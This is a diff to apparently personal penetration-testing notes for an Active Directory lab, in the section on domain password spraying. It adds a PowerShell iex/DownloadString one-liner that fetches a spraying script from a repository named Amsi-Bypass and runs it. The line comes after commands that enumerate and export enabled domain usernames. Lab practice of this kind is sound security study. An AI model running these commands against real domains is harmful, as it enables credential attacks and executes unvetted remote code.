@@ -601,7 +601,7 @@ Find DCs with DNS Query
 nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
 ```
 
-# 6. password spray
+# 6. domain password spray
 ```
 Get-ADUser -Filter * -Properties EmailAddress, Enabled, LastLogonDate |
     Select-Object Name, SamAccountName, EmailAddress, Enabled, LastLogonDate |
@@ -610,6 +610,8 @@ Get-ADUser -Filter * -Properties EmailAddress, Enabled, LastLogonDate |
 Get-ADUser -Filter 'Enabled -eq $true' |
     Select-Object -ExpandProperty SamAccountName |
     Out-File "$env:USERPROFILE\Desktop\Enabled_ADUsers.txt" -Encoding UTF8
+
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/main/dpspray.ps1');dpspray
 
 ```
 
